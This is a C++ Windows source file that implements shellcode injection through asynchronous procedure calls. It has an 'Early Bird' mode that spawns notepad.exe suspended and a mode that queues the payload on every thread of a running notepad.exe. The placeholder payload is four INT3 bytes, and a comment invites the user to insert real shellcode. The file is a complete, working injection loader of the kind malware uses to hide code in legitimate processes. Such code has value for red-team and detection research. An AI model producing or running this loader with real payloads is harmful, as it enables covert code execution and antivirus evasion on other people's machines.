#include <iostream>
#include <vector>
#include <string>
#include <Windows.h>
#include <TlHelp32.h>
#include "CWLInc.h"
using namespace std;

#ifndef NTSTATUS
using NTSTATUS = LONG;
#endif

#ifndef NTAPI
#define NTAPI __stdcall
#endif

#ifndef NTSYSAPI
#define NTSYSAPI DECLSPEC_IMPORT
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
// =============================================================


// Find a process ID and its threads by name
BOOL FindTargetProcess(const wstring& exe, DWORD& pid, vector<DWORD>& vTids) {
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32 pe32{ sizeof(PROCESSENTRY32) };
    THREADENTRY32 te32{ sizeof(THREADENTRY32) };

    // Create Snapshots of the processes and threads
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // Retrieve the information about the first process in snapshot
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Compare if the process in snapshot is our target process
            if (_wcsicmp(reinterpret_cast<const wchar_t *>(pe32.szExeFile), exe.c_str()) == 0) {
                pid = pe32.th32ProcessID;
                wcout << L"[+] Found Process: " << exe << L"\n";
                wcout << L"[+] Process id: " << pe32.th32ProcessID << L"\n";

                if (Thread32First(hSnapshot, &te32)) {
                    do {
                        // if thread's owner id is equal to our target process id
                        // then store the thread id
                        if (te32.th32OwnerProcessID == pe32.th32ProcessID) {
                            vTids.push_back(te32.th32ThreadID);
                        }
                    } while (Thread32Next(hSnapshot, &te32));
                }
                CloseHandle(hSnapshot);
                return TRUE;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return TRUE;
}

BOOL EarlyBird(unsigned char payload[], SIZE_T payloadSize) {
    PROCESS_INFORMATION procInfo{}; // Zero initialized
    STARTUPINFOA startInfo{};
    LPVOID baseAddress = nullptr;
    DWORD oldProtect = 0;

#ifdef _WIN64
    string targetExePath = "C:\\Windows\\System32\\notepad.exe";
#else
    string targetExePath = "C:\\Windows\\SysWow64\\notepad.exe";
#endif

    // CreateProcessA requires a mutable buffer, passing a string literal is unsafe.
    // We copy the path into a vector to create a safe mutable buffer.
    vector<char> cmdLine(targetExePath.begin(), targetExePath.end());
    cmdLine.push_back('\0');

    // Creating target process in suspended mode
    wcout << L"[+] Creating target process in suspended mode... \n";
    if (!CreateProcessA(nullptr, cmdLine.data(), nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &startInfo, &procInfo)) {
        wcerr << L"[-] Error creating process in suspended mode: " << GetLastError() << L"\n";
        exit(-1);
    }

    // Allocating memory in remote process with protection PAGE_READWRITE
    wcout << L"[+] Allocate memory in target process...\n";
    baseAddress = VirtualAllocEx(procInfo.hProcess, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!WriteProcessMemory(procInfo.hProcess, baseAddress, payload, payloadSize, nullptr)) {
        wcerr << L"[-] Error writing payload into the remote process... \n";
        TerminateProcess(procInfo.hProcess, 0);
        exit(-1);
    }
    wcout << L"[+] Memory allocated at address: " << baseAddress << L"\n";

    // Changing memory protection of allocated memory from PAGE_READWRITE to PAGE_EXECUTE_READ
    wcout << L"[+] Changing memory protection RW -> RX\n";
    if (!VirtualProtectEx(procInfo.hProcess, baseAddress, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        wcerr << L"[-] Error changing memory protection... \n";
        TerminateProcess(procInfo.hProcess, 0);
        exit(-1);
    }

    // Setting up the routine (APC routine)
    auto tRoutine = reinterpret_cast<PAPCFUNC>(baseAddress);

    // Put our payload/APC function in queue
    wcout << L"[+] Putting our payload in queue....\n";
    QueueUserAPC(tRoutine, procInfo.hThread, 0);

    // Resume the thread
    wcout << L"[+] Resuming Thread....\n";
    ResumeThread(procInfo.hThread);
    Sleep(1000 * 2);

    // Cleanup
    CloseHandle(procInfo.hThread);
    CloseHandle(procInfo.hProcess);

    return TRUE;
}

BOOL APCInjection(unsigned char payload[], SIZE_T payloadSize, const wstring& mode) {
    // Executing Early Bird APC injection
    if (_wcsicmp(L"earlybird", mode.c_str()) == 0) {
        BOOL isSuccess = EarlyBird(payload, payloadSize);
        if (isSuccess) {
            wcout << L"Done..!!" << endl;
            return TRUE;
        }
        else {
            wcerr << L"[-] Error executing early bird...\n";
            return FALSE;
        }
    }

    // Standard APC Injection via NT API
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto pNtAllocateVirtualMemory = reinterpret_cast<_NtAllocateVirtualMemory>(GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));

    if (pNtAllocateVirtualMemory == nullptr) {
        wcerr << L"[-] Couldn't find API NtAllocateVirtualMemory..." << endl;
        exit(-1);
    }

    wstring exeName = L"notepad.exe";
    BOOL isSuccess = FALSE;
    DWORD pid = 0;
    DWORD oldProtect = 0;
    vector<DWORD> tids;

    wcout << L"[+] Looking for target process...\n";
    isSuccess = FindTargetProcess(exeName, pid, tids);
    if (!isSuccess || pid == 0) {
        wcerr << L"[-] Unable to find target process...\n";
        exit(-1);
    }

    // Opening target process with process id
    wcout << L"[+] Opening the target process...\n";
    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hTargetProcess == INVALID_HANDLE_VALUE || hTargetProcess == nullptr) {
        wcerr << L"[-] Unable to open target process... \n";
        exit(-1);
    }

    // Allocate memory in target process
    wcout << L"[+] Allocating memory in target process...\n";
    PVOID baseAddress = nullptr;
    SIZE_T allocSize = payloadSize;

    NTSTATUS status = pNtAllocateVirtualMemory(hTargetProcess, &baseAddress, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        wcerr << L"[-] Unable to allocate memory in target process...\n";
        CloseHandle(hTargetProcess);
        exit(-1);
    }
    wcout << L"[+] Allocated memory at address: " << baseAddress << L"\n";

    // Writing payload into the target process
    if (!WriteProcessMemory(hTargetProcess, baseAddress, payload, payloadSize, nullptr)) {
        wcerr << L"[-] Failed to write shellcode into target process memory...\n";
        CloseHandle(hTargetProcess);
        exit(-1);
    }

    wcout << L"[+] Setting memory protection to RX...\n";
    // Change Protection rw -> rx
    if (!VirtualProtectEx(hTargetProcess, baseAddress, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        wcerr << L"[-] Failed to convert protection rw->...\n";
        CloseHandle(hTargetProcess);
        exit(-1);
    }

    // Create an thread routine
    auto tRoutine = reinterpret_cast<PAPCFUNC>(baseAddress);

    // loop through all thread ids
    wcout << L"[+] Putting the shellcode in APC queue...\n";
    for (DWORD tid : tids) {
        // Open the thread with thread id
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, tid);
        if (hThread != nullptr && hThread != INVALID_HANDLE_VALUE) {
            // This will put our shellcode (APC function) in queue
            QueueUserAPC(tRoutine, hThread, 0);
            CloseHandle(hThread); // Always close handles!
            Sleep(1000 * 2);
        }
    }

    CloseHandle(hTargetProcess);
    return TRUE;
}

int main() {
    // Hello world shellcode
    unsigned char buf[] = "\xCC\xCC\xCC\xCC"; //write your shellcode here, for example: "\xCC\xCC\xCC\xCC"; // 4 INT 3 instructions for testing


    // Select mode: "earlybird" or "normal"

    wstring mode = L"earlybird";
    // wstring mode = L"normal";

    SIZE_T payloadSize = sizeof(buf);

    APCInjection(buf, payloadSize, mode);

    return 0;
}
